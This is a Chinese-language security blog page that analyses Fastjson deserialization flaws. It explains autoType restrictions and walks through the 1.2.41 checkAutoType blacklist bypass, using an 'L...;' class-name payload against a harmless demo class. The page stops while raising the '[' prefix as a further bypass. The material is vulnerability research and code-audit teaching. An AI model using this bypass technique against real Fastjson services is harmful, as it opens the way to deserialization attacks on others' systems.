<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Fastjson各版本漏洞分析 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Fastjson各版本漏洞分析 | d4m1ts 知识库"><meta data-rh="true" name="description" content="前言"><meta data-rh="true" property="og:description" content="前言"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"应用漏洞分析","item":"https://blog.gm7.org/docs/category/应用漏洞分析"},{"@type":"ListItem","position":3,"name":"Fastjson各版本漏洞分析","item":"https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.4c121756.js" defer="defer"></script>
<script src="/assets/js/main.5f81c564.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="折叠侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/log4j反序列化漏洞分析">log4j反序列化漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析">Fastjson 1.2.24反序列化漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson的dnslog探测方式分析">Fastjson的dnslog探测方式分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析">Fastjson各版本漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson1.2.68分析">Fastjson1.2.68分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析">log4j2_rce分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/IDEA远程调试Shiro550">IDEA远程调试Shiro550</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/其他">其他</a><button aria-label="展开侧边栏分类 &#x27;其他&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/应用漏洞分析"><span>应用漏洞分析</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Fastjson各版本漏洞分析</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Fastjson各版本漏洞分析</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a href="#前言" class="hash-link" aria-label="前言的直接链接" title="前言的直接链接">​</a></h2>
<p>最先出现问题的Fastjson 1.2.24反序列化漏洞已经分析过了，产生漏洞的原理也差不多理解了</p>
<ul>
<li>
<p>在1.2.25之后的版本，以及所有的.sec01后缀版本中，autotype功能默认是受限的（黑白名单机制）</p>
</li>
<li>
<p>在1.2.68之后的版本，fastjson增加了safeMode的支持。配置safeMode后，无论白名单和黑名单，都不支持autoType</p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="概念">概念<a href="#概念" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h2>
<p>可能出现一些新的概念，给一些参考链接吧</p>
<ul>
<li>
<p><a href="https://github.com/alibaba/fastjson/issues/3218" target="_blank" rel="noopener noreferrer">FastJSON为什么要有autoType功能</a></p>
</li>
<li>
<p><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener noreferrer">enable_autotype</a></p>
</li>
<li>
<p><a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener noreferrer">fastjson_safemode</a></p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="演示代码">演示代码<a href="#演示代码" class="hash-link" aria-label="演示代码的直接链接" title="演示代码的直接链接">​</a></h2>
<p>后面的分析代码都以此为基础修改</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json = &quot;{\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(JSON.parseObject(json));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class User {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private String username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private int age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setUsername(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.username = username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String getUsername() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call getUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAge(int age) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.age = age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setAge&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int getAge() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1224">fastjson 1.2.24<a href="#fastjson-1224" class="hash-link" aria-label="fastjson 1.2.24的直接链接" title="fastjson 1.2.24的直接链接">​</a></h2>
<p>之前已经分析过了，就不在写了</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1241">fastjson 1.2.41<a href="#fastjson-1241" class="hash-link" aria-label="fastjson 1.2.41的直接链接" title="fastjson 1.2.41的直接链接">​</a></h2>
<blockquote>
<p>利用的前提是必须要手动开启autoTypeSupport，不然还是不能利用，所以说还是有一点鸡肋吧</p>
<p>从代码中开启<code>autoTypeSupport</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></span></code></pre></div></div>
</blockquote>
<p>在1.2.25之后的版本，以及所有的.sec01后缀版本中，增加了checkAutotype函数，autotype功能默认是受限的（黑白名单机制）</p>
<p>但在1.2.25到1.2.41之间，发生过一次<code>checkAutotype</code>的绕过。</p>
<p>Payload如下</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;Lorg.example.User;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;age&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;username&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;test&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>我们用这个payload来分析一下如何绕过的（fastjson 1.2.41）</p>
<p>进入<code>checkAutoType</code>后，首先会对<code>typeName</code>的长度进行判断，很明显这个条件满足不了，所以不会抛出异常</p>
<p><img decoding="async" loading="lazy" alt="image-20211018151129254" src="/assets/images/image-20211018151129254-af72896e596a27e86e7985a4d1c40b53.png" width="2624" height="260" class="img_ev3q"></p>
<p>继续向下，开启<code>autoTypeSupport</code>时，会先通过黑白名单来判断，先白名单后黑名单</p>
<p><img decoding="async" loading="lazy" alt="image-20211018151245011" src="/assets/images/image-20211018151245011-7ff501c63ae726c57e0b8efac8edff7d.png" width="2770" height="1924" class="img_ev3q"></p>
<p>很明显我们传入的<code>typeName</code> <code>Lorg.example.User;</code>肯定是不在黑名单内的，这是一个绕过的点</p>
<p><img decoding="async" loading="lazy" alt="image-20211018151354101" src="/assets/images/image-20211018151354101-59dda187535529e03f68541264836d68.png" width="924" height="1116" class="img_ev3q"></p>
<p>继续向下，如果<code>clazz==null</code>，就会调用<code>TypeUtils.getClassFromMapping(typeName);</code>，跟一下其实就是从一个<code>ConcurrentHashMap</code>中看看存不存在这个类，很明显我们传入的L开头的类是不会存在的</p>
<p><img decoding="async" loading="lazy" alt="image-20211018151755237" src="/assets/images/image-20211018151755237-0f6ed22a974aec2fa8a66e025bb73ba5.png" width="3584" height="2240" class="img_ev3q"></p>
<p>继续向下，和上面类似，我们这个类还是找不到的，所以clazz还是<code>null</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211018152524885" src="/assets/images/image-20211018152524885-543920fc15758678c2e38cc5f96a452f.png" width="3584" height="2240" class="img_ev3q"></p>
<p>没开启<code>autoTypeSupport</code>的情况下，依然会进行黑白名单检测，先黑名单后白名单，我们这里手动开启了所以这里不管，因为会跳过</p>
<p><img decoding="async" loading="lazy" alt="image-20211018152700900" src="/assets/images/image-20211018152700900-5e833918a556b27fcc6bbaa9c4a15b58.png" width="2682" height="1064" class="img_ev3q"></p>
<p>前面黑名单检测都没问题，就会开始加载这个类了</p>
<p><img decoding="async" loading="lazy" alt="image-20211018152856940" src="/assets/images/image-20211018152856940-3cbbca2a685985570c77454c25ff0134.png" width="2086" height="618" class="img_ev3q"></p>
<p>跟进<code>loadClass</code>，如果第一个字符是<code>[</code>，就会去掉<code>[</code>再去解析，我们这里不满足就先不看，继续向下</p>
<p><img decoding="async" loading="lazy" alt="image-20211018153223293" src="/assets/images/image-20211018153223293-17036d9da7ea5a122a1a8c07a968b865.png" width="3584" height="2240" class="img_ev3q"></p>
<p>这个条件就是这次绕过的核心条件了</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    String newClassName = className.substring(1, className.length() - 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return loadClass(newClassName, classLoader);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>如果开头是<code>L</code>而且结尾是<code>;</code>，那么就会给前后这俩字符去掉，所以可以看到我们的<code>newClassName</code>就是我们想要的<code>org.example.User</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211018153507660" src="/assets/images/image-20211018153507660-018456adc4b6f96dd552cd8cfa4abc54.png" width="2806" height="1860" class="img_ev3q"></p>
<p>后续就会加载我们的类实例化，达到我们绕过的目的</p>
<p><img decoding="async" loading="lazy" alt="image-20211018153759233" src="/assets/images/image-20211018153759233-af68f886c8c53c3105257e51ae7d6bab.png" width="1354" height="230" class="img_ev3q"></p>
<hr>
<p>debug过程中，可能大家注意到一个点，<code>loadClass</code>函数中，有一个条件，如果第一个字符是<code>[</code>，就会去掉<code>[</code>再去实例化，那这个地方是不是也能用来绕过呢？</p>
